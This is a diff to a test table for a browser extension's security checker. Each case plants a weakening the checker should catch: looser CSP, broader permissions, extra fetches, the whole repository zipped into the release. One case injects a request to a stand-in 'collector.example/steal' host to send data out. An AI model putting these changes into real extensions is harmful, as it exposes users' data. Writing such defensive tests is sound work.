@@ -59,6 +59,14 @@ const cases = [
   ['letting other extensions connect', editManifest(manifest => { manifest.externally_connectable = { matches: ['*://*/*'] }; }), 'manifest'],
   ['a looser CSP', editManifest(manifest => { manifest.content_security_policy.extension_pages = manifest.content_security_policy.extension_pages.replace("connect-src 'none'", 'connect-src *'); }), 'manifest'],
   ['no CSP', editManifest(manifest => { delete manifest.content_security_policy; }), 'manifest'],
+  ['a Firefox build with more reach', folder => {
+    const path = join(folder, 'tools/firefox.json');
+    const config = JSON.parse(readFileSync(path, 'utf8'));
+    config.removePermissions.push('storage');
+    config.addKeys.browser_specific_settings.gecko.data_collection_permissions.required = ['none'];
+    writeFileSync(path, JSON.stringify(config));
+  }, 'firefox'],
+  ['the Firefox background script fetching', append('firefox/background.js', "fetch('/x');"), 'limit'],
   ['a content script on another site', editManifest(manifest => manifest.content_scripts[0].matches.push('https://*/*')), 'manifest'],
   ['a second fetch', append('content/bridge.js', "fetch('/x');"), 'limit'],
   ['an API path that changes the host', append('src/c1-api.js', "request('@collector.example/steal');"), 'request-path'],
@@ -86,6 +94,8 @@ const cases = [
   ['a stylesheet import', append('sidepanel/panel.css', "@import 'theme.css';"), 'banned'],
   ['a minified line', append('sidepanel/panel.js', `const blob = '${'a'.repeat(400)}';`), 'long-line'],
   ['a new kind of shipped file', folder => writeFileSync(join(folder, 'src/engine.wasm'), 'x'), 'shipped-files'],
+  ['adding the whole repository to the store zip', replace('.github/workflows/release.yml', 'zip -r -X store.zip manifest.json service-worker.js content sidepanel src icons LICENSE', 'zip -r -X store.zip manifest.json service-worker.js content sidepanel src icons LICENSE\n          zip -r -X store.zip .'), 'packaging'],
+  ['a changed Firefox build script', append('tools/build-firefox.mjs', '// ships extra files'), 'pinned-file'],
   ['an extra folder in the store zip', replace('.github/workflows/release.yml', 'zip -r -X store.zip manifest.json', 'zip -r -X store.zip vendor manifest.json'), 'packaging'],
   ['a HAR capture', folder => { mkdirSync(join(folder, 'har')); writeFileSync(join(folder, 'har/session.har'), '{}'); }, 'forbidden-file'],
   ['a real-looking card number', append('README.md', `My card: ${realLookingNumber()}`), 'card-number'],
